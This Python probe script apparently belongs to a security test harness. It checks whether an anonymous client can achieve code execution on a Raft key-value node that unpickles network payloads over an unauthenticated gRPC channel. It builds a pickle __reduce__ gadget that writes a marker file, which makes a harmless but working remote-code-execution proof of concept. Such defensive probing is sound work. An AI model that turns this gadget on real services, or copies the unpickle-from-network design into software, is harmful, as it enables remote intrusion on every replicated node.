"""Claim: an unauthenticated network client cannot execute code on a node.

KeyValueStateMachine.apply() calls pickle.loads() on the entry payload, and
that payload arrives straight from the network: ClientWrite carries opaque
bytes which are appended to the log, replicated, and then unpickled on EVERY
node in the cluster. pickle is a code-execution format by design -- unpickling
attacker-controlled bytes is arbitrary code execution.

The transport offers no defence: node/service.py uses add_insecure_port() and
insecure_channel(), so there is no TLS, no peer authentication and no client
authorisation anywhere. Any client that can open a TCP connection to the port
can submit a payload.

This probe uses a deliberately BENIGN payload: it writes a marker file into
the probe's own temp directory. Observing that file proves arbitrary code ran.
Nothing destructive is executed and nothing outside the temp directory is
touched.

BLAST RADIUS: local only -- writes one marker file into a temp dir.
"""

from __future__ import annotations

import asyncio
import pickle
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

from _harness import (  # noqa: E402
    HOST,
    client_write,
    free_port,
    make_node,
    probe_dir,
    run_probe,
    wait_for,
)


class BenignProofOfExecution:
    """Unpickling this object calls Path.write_text -- harmless, but arbitrary."""

    def __init__(self, marker: str):
        self.marker = marker

    def __reduce__(self):
        return (_write_marker, (self.marker,))


def _write_marker(path: str) -> None:
    Path(path).write_text("code executed via unpickling of a network payload\n")


async def main(probe) -> None:
    data_dir = probe_dir("unauth_rce")
    marker = str(Path(data_dir) / "PROOF_OF_EXECUTION")
    port = free_port()
    addr = f"{HOST}:{port}"

    node = make_node("n1", [], addr, data_dir)
    await node.start()
    probe.observe(f"node listening on {addr} (add_insecure_port: no TLS, no authentication)")

    elected = await wait_for(lambda: node.state.role.value == "leader", timeout=5.0)
    probe.expect(elected, "node is leader and will accept client writes")

    probe.observe(f"marker file exists before the write? {Path(marker).exists()}")

    # An anonymous client -- no credentials of any kind are presented.
    # The RPC may itself error: the payload runs during apply, and whatever it
    # returns then flows into the KV op dispatch. Execution happens first, so
    # the error is irrelevant to the question being asked here.
    payload = pickle.dumps(BenignProofOfExecution(marker))
    try:
        resp = await client_write(addr, payload)
        probe.observe(f"anonymous ClientWrite -> accepted={resp.accepted} index={resp.index}")
    except Exception as exc:  # noqa: BLE001
        probe.observe(
            f"anonymous ClientWrite raised {type(exc).__name__} "
            f"(the handler crashed AFTER the payload ran)"
        )

    await asyncio.sleep(0.3)
    executed = Path(marker).exists()
    probe.observe(f"marker file exists after the write?  {executed}")
    if executed:
        probe.observe(f"marker contents: {Path(marker).read_text().strip()!r}")

    probe.expect(
        not executed,
        "an unauthenticated ClientWrite did not cause arbitrary code to run on the node",
    )
    probe.observe(
        "note: in a real cluster the payload is REPLICATED, so every follower unpickles "
        "it too -- one anonymous request executes on every node that applies the entry"
    )

    await node.stop()


run_probe(
    "unauthenticated-rce",
    "an unauthenticated network client cannot execute code on a raft node",
    main,
)
